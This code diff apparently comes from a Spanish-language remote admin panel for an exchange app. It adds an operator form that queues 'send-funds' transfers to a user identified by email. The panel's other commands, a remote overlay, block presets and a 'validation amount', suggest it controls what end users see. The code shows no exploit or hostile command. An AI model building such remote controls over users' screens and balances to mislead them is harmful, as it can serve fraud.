@@ -89,7 +89,8 @@
     'update-rate': 'Actualización de tasa',
     'set-validation-amount': 'Monto de validación',
     'show-overlay': 'Overlay remoto',
-    'hide-overlay': 'Ocultar overlay'
+    'hide-overlay': 'Ocultar overlay',
+    'send-funds': 'Transferencia entre usuarios'
   };
 
   const BLOCK_PRESETS = {
@@ -938,6 +939,116 @@
     return { sender, amount, currency, code };
   }
 
+  function inferNameFromEmail(email) {
+    if (typeof email !== 'string') return '';
+    const trimmed = email.trim();
+    if (!trimmed) return '';
+    const base = trimmed.split('@')[0] || '';
+    const normalized = base.replace(/[._-]+/g, ' ').trim();
+    if (!normalized) return '';
+    return normalized.replace(/\b\w/g, (char) => char.toUpperCase());
+  }
+
+  function collectRemoteTransferFormValues() {
+    const directionSelect = document.getElementById('remote-transfer-direction');
+    const recipientInput = document.getElementById('remote-transfer-recipient');
+    const amountInput = document.getElementById('remote-transfer-amount-value');
+    const currencySelect = document.getElementById('remote-transfer-currency-select');
+    const noteInput = document.getElementById('remote-transfer-note');
+    const referenceInput = document.getElementById('remote-transfer-reference');
+
+    const direction = directionSelect && typeof directionSelect.value === 'string'
+      ? directionSelect.value.toLowerCase()
+      : 'send';
+    const emailRaw = recipientInput && typeof recipientInput.value === 'string'
+      ? recipientInput.value.trim()
+      : '';
+    const amount = toNumber(amountInput ? amountInput.value : null);
+    const currency = currencySelect && typeof currencySelect.value === 'string'
+      ? currencySelect.value.toLowerCase()
+      : 'usd';
+    const note = noteInput && typeof noteInput.value === 'string' ? noteInput.value.trim() : '';
+    const referenceRaw = referenceInput && typeof referenceInput.value === 'string'
+      ? referenceInput.value.trim()
+      : '';
+
+    return {
+      direction: direction === 'receive' ? 'receive' : 'send',
+      email: emailRaw.toLowerCase(),
+      amount,
+      currency,
+      note,
+      reference: referenceRaw
+    };
+  }
+
+  function resetRemoteTransferForm() {
+    const form = document.getElementById('remote-transfer-form');
+    if (form && typeof form.reset === 'function') {
+      form.reset();
+    }
+    const directionSelect = document.getElementById('remote-transfer-direction');
+    if (directionSelect) {
+      directionSelect.value = 'send';
+    }
+  }
+
+  function handleRemoteTransferSubmit() {
+    const values = collectRemoteTransferFormValues();
+    if (!values.email) {
+      showRemoteFeedback('Ingresa el correo electrónico del usuario destino.', 'error');
+      return;
+    }
+
+    if (!Number.isFinite(values.amount) || values.amount <= 0) {
+      showRemoteFeedback('Ingresa un monto válido para la transferencia.', 'error');
+      return;
+    }
+
+    const allowedCurrencies = ['usd', 'ves', 'bs', 'eur', 'usdt'];
+    const normalizedCurrency = allowedCurrencies.includes(values.currency)
+      ? (values.currency === 'bs' ? 'ves' : values.currency)
+      : 'usd';
+
+    const referenceSanitized = values.reference
+      ? values.reference.replace(/[^A-Za-z0-9\-_.]/g, '').slice(0, 32)
+      : '';
+    const transferId = referenceSanitized && referenceSanitized.length >= 3
+      ? referenceSanitized
+      : `remote-${Date.now().toString(16)}`;
+    const counterpartyName = inferNameFromEmail(values.email);
+    const createdAt = new Date().toISOString();
+
+    const payload = {
+      transferId,
+      direction: values.direction,
+      amount: values.amount,
+      currency: normalizedCurrency,
+      note: values.note,
+      counterpartyEmail: values.email,
+      counterpartyName,
+      reference: referenceSanitized || undefined,
+      createdAt
+    };
+
+    const meta = {
+      action: values.direction,
+      target: values.email,
+      reference: referenceSanitized || null,
+      context: 'intercambio'
+    };
+
+    enqueueRemoteCommand('send-funds', payload, meta);
+    showRemoteFeedback('Transferencia remota registrada y en cola de sincronización.', 'success');
+
+    const amountInput = document.getElementById('remote-transfer-amount-value');
+    const noteInput = document.getElementById('remote-transfer-note');
+    const referenceInput = document.getElementById('remote-transfer-reference');
+    if (amountInput) amountInput.value = '';
+    if (noteInput) noteInput.value = '';
+    if (referenceInput) referenceInput.value = '';
+  }
+
   function collectOverlayOverrides() {
     const overrides = {};
     const titleInput = document.getElementById('remote-overlay-title');
@@ -1384,6 +1495,22 @@
         updateBlockMessagePlaceholder();
       });
       updateBlockMessagePlaceholder();
+    }
+
+    const transferSubmit = document.getElementById('remote-transfer-submit');
+    if (transferSubmit) {
+      transferSubmit.addEventListener('click', function (event) {
+        event.preventDefault();
+        handleRemoteTransferSubmit();
+      });
+    }
+
+    const transferReset = document.getElementById('remote-transfer-reset');
+    if (transferReset) {
+      transferReset.addEventListener('click', function (event) {
+        event.preventDefault();
+        resetRemoteTransferForm();
+      });
     }
 
     refreshRemoteControlPanel();
